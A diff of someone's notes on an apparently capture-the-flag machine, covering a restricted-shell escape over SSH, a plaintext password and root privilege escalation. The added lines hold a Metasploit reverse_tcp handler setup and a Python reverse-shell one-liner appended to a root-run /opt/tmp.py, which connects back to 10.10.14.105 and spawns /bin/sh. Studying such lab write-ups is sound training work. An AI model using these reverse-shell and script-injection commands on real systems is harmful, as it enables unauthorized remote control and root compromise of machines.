@@ -117,6 +117,7 @@ user.txt
   <h3>Escape  Restricted shell</h3>
     https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
     sh mindy@10.10.10.51 -t "bash --noprofile"
+      pass: P@55W0rd1!2@
 
   <h3>Getting root</h3>
   /opt$ cat tmp.py
@@ -128,19 +129,18 @@ user.txt
     except:
        sys.exit()
 
-   /usr/sbin/anacron -help
-   anacron -f <job>
+
+  <h3>Reverse shell</h3>
+
+    use exploit/multi/handler
+    set PAYLOAD linux/x86/meterpreter/reverse_tcp
+    set LHOST 10.10.14.105
+    set LPORT 4105
+    set ExitOnSession false
+    exploit -j -z
 
 
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.105",4105));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /opt/tmp.py
 
-<h2>msfvenom - not used</h2>
-  (Payload for james 232 sploit)
 
-  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.105 LPORT=4105 -e x86/shikata_ga_nai -b '\\' -f elf > 4105.elf
-
-  use exploit/multi/handler
-  set PAYLOAD linux/x86/meterpreter/reverse_tcp
-  set LHOST 10.10.14.105
-  set LPORT 4105
-  set ExitOnSession false
-  exploit -j -z
+load stdapi
